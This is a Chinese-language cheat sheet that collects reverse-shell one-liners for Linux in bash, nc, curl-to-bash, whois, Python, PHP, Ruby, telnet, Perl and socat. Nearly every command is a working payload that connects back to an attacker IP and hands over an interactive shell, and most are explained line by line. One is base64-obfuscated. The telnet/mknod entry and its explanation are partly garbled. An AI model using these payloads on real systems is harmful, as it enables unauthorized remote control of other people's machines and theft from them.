# 反弹shell总结
## Linux
### bash反弹
```
bash -i >& /dev/tcp/ip_address/port 0>&1
```
> 1. bash -i   打开一个交互的bash
>
> 2. & 将标准错误输出重定向到标准输出
> 3. /dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口
> 4. 0>&1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互
在特殊情况可以使用base64编码执行bash反弹shell
```
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'
```
### nc反弹
```
nc -e /bin/sh 192.168.0.8 7777
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
> 1. rm /tmp/f：删除/tmp/f文件。
> 2. mkfifo /tmp/f：创建名为/tmp/f的管道。
> 3. cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f：通过管道实现反向 shell，从远程主机10.0.0.1的端口1234读取命令，并通过/bin/sh命令执行，并将输出结果写入管道/tmp/f。
### **curl反弹**
Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。
```
┌──(root💀kali)-[/var/www/html]
└─# cat base.html                          
bash -i >& /dev/tcp/192.168.0.8/7777 0>&1
```
```
curl 192.168.0.8/base.html|bash
```
![]()
### **whois反弹**
反弹的shell只能执行后面带的命令
```
whois -h 192.168.0.8 -p 7777 `pwd`
```
![]()
### **python反弹** 
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.8",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
> 1. python -c：执行后面的 Python 代码。
> 2. import socket,subprocess,os：导入 Python 标准库中的 socket、subprocess 和 os 模块。
> 3. s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)：创建一个 TCP 套接字。
> 4. s.connect(("192.168.0.8",7777))：连接到远程主机 192.168.0.8 的 7777 端口。
> 5. os.dup2(s.fileno(),0)：将标准输入重定向到套接字。
> 6. os.dup2(s.fileno(),1)：将标准输出重定向到套接字。
> 7. os.dup2(s.fileno(),2)：将标准错误重定向到套接字。
> 8. p=subprocess.call(["/bin/sh","-i"])：执行/bin/sh命令，并以交互模式运行。
![]()
### **PHP反弹**
```
php -r '$sock=fsockopen("192.168.0.8",7777);exec("/bin/sh -i &3 2>&3");'
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $sock=fsockopen("192.168.0.8",7777)：打开一个到 192.168.0.8 的 7777 端口的 socket 连接。
> 3. exec("/bin/sh -i &3 2>&3")：执行/bin/sh命令，并以交互模式运行，并通过 socket 连接读写数据。
![]()
```
php -r '$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $s=fsockopen("10.10.10.11",443)：打开一个到 10.10.10.11 的 443 端口的 socket 连接。
> 3. `$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes)`：通过 socket 连接执行/bin/sh命令，并以交互模式运行。
![]()
```
php -r '$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i &3 2>&3");'
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $s=fsockopen("10.10.10.11",443)：打开一个到 10.10.10.11 的 443 端口的 socket 连接。
> 3. shell_exec("/bin/sh -i &3 2>&3")：通过 socket 连接执行/bin/sh命令，并以交互模式运行。
![]()
```
php -r '$s=fsockopen("10.10.10.11",443);`/bin/sh -i &3 2>&3`;'
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $s=fsockopen("10.10.10.11",443)：打开一个到 10.10.10.11 的 443 端口的 socket 连接。
> 3. `/bin/sh -i &3 2>&3`：通过 socket 连接执行/bin/sh命令，并以交互模式运行。
![]()
```
php -r '$s=fsockopen("192.168.32.130",7777);system("/bin/sh -i &3 2>&3");' 
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $s=fsockopen("192.168.32.130",7777)：打开一个到 192.168.32.130 的 7777 端口的 socket 连接。
> 3. system("/bin/sh -i &3 2>&3")：通过 socket 连接执行/bin/sh命令，并以交互模式运行。
![]()
```
php -r '$s=fsockopen("192.168.32.130",7777);popen("/bin/sh -i &3 2>&3", "r");'
```
> 1. php -r：执行后面的 PHP 代码。
> 2. $s=fsockopen("192.168.32.130",7777)：打开一个到 192.168.32.130 的 7777 端口的 socket 连接。
> 3. popen("/bin/sh -i &3 2>&3", "r")：通过 socket 连接执行/bin/sh命令，并以读取模式打开。
![]()
### **ruby反弹**
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.32.130","7777");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
> 1. ruby -rsocket：使用 Ruby 命令行工具，并加载 socket 库。
> 2. exit if fork：父进程退出。
> 3. c=TCPSocket.new("192.168.32.130","7777")：打开一个到 192.168.32.130 的 7777 端口的 TCP socket 连接。
> 4. while(cmd=c.gets)：循环读取从 socket 中获得的命令。
> 5. IO.popen(cmd,"r")：通过命令行执行 cmd，并以读取模式打开。
> 6. c.print io.read：将 IO 对象读取的结果通过 socket 返回。
![]()
### telnet反弹
攻击者主机上打开两个终端分别执行监听：
```
nc -lvvp 4444
nc -lvvp 5555
```
目标主机中执行：
```
telnet 192.168.0.8 4444 | /bin/bash | telnet 192.168.0.8 5555 
```
监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip
反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。
![]()
```
mknod a p; telnet 192.168.32.130 7777 0a
```
> 1. mknod a p：创建一个名为 "a" 的管道文件。
> 2. telnet 192.168.32.130 7777：打开一个到 192.168.32.130 的 7777 端口的 Telnet 连接。
> 3. 0 4. /bin/bash 1>a：将 /bin/bash 的标准输出重定向到管道文件 "a"。
![]()
### perl反弹
```
perl -e 'use Socket;$i="192.168.32.130";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
> 这段代码是一段perl脚本，用于远程命令执行。它使用了Socket库，并连接到地址为192.168.32.130，端口为7777的服务器。如果连接成功，它将使用/bin/sh -i命令替换当前程序，并重定向标准输入，输出和错误流到连接的套接字。
![]()
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.32.130:7777");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
> 这是一个Perl代码片段，它使用了IO库，在本地创建一个新的进程，并使用TCP协议连接到IP地址为"192.168.32.130"，端口为7777的远程主机。一旦连接成功，将标准输入，输出和错误重定向到该连接，并执行"/bin/sh -i"命令。
![]()
```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.32.130:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
```
> 这段代码是在使用Perl编写的代码。它连接到一个IP地址为192.168.32.130，端口为4444的服务器，并使用"IO::Socket::INET"模块创建一个套接字。它进一步将标准输入和标准输出重定向到该套接字，并在套接字上执行来自标准输入的命令。
### socat反弹
攻击机开启本地监听
```
socat TCP-LISTEN:9999 -
或
nc -lvvp 9999
```